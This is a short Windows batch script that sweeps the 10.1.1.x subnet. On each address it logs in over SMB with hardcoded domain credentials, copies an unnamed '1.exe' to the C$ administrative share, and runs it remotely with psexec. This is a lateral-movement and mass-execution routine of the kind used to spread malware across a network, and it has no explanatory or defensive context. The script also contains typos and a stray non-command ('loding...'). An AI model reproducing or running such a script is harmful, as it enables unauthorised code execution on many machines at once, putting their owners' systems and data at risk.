@echo off&loding...&color a&mode con: cols=60 lines=22
setlocal enabledelayedexpansion
set ipq=10.1.1
set /a ip1=1
set /a ip2=255
set /a con=0
set /a contotal=%ip2%-%ip1%+1
for /l %%i in (!ip1!,1,!ip2!) do (
set ip=!ipq!.%%i
echo sacn!ip!
net use \\!ip! password /user:domain\user
copy 1.exe \\!ip!\C$\
psexec \\!ip! c:\1.exe
)
